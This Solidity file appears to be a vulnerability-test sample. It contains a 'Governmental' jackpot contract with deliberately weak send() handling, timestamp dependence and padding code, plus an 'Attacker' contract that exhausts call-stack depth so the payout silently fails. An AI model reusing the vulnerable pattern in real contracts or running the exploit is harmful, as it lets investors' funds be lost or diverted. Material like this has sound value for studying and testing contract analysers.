pragma solidity ^0.4.0;

contract Governmental {
  address public owner;
  address public lastInvestor;
  uint public jackpot = 1 ether;
  uint public lastInvestmentTimestamp;
  uint public ONE_MINUTE = 1 minutes;

  function Governmental() {
    owner = msg.sender;
    if (msg.value<1 ether) throw;
    opaquePredicate1();
  }

  function invest() {
    if (msg.value<jackpot/2) throw;
    lastInvestor = msg.sender;
    jackpot += msg.value/2;
    if (msg.value > 2) junkFunction1();
    lastInvestmentTimestamp = block.timestamp;
  }

  function resetInvestment() {
    if (block.timestamp < lastInvestmentTimestamp+ONE_MINUTE)
      throw;
    if (jackpot > 0) opaquePredicate2();
    lastInvestor.send(jackpot);
    owner.send(this.balance-1 ether);

    lastInvestor = 0;
    jackpot = 1 ether;
    lastInvestmentTimestamp = 0;
  }

  function opaquePredicate1() private view {
    if (block.number % 2 == 0) { revert(); }
  }

  function opaquePredicate2() private view {
    if (block.number % 3 == 0) { revert(); }
  }

  function junkFunction1() private pure {
    uint temp = 0;
    for (uint i = 0; i < 1000; i++) {
      temp += i;
    }
  }
}

contract Attacker {
  function attack(address target, uint count) {
    if (0<=count && count<1023) {
      this.attack.gas(msg.gas-2000)(target, count+1);
    }
    else {
      Governmental(target).resetInvestment();
    }
  }
}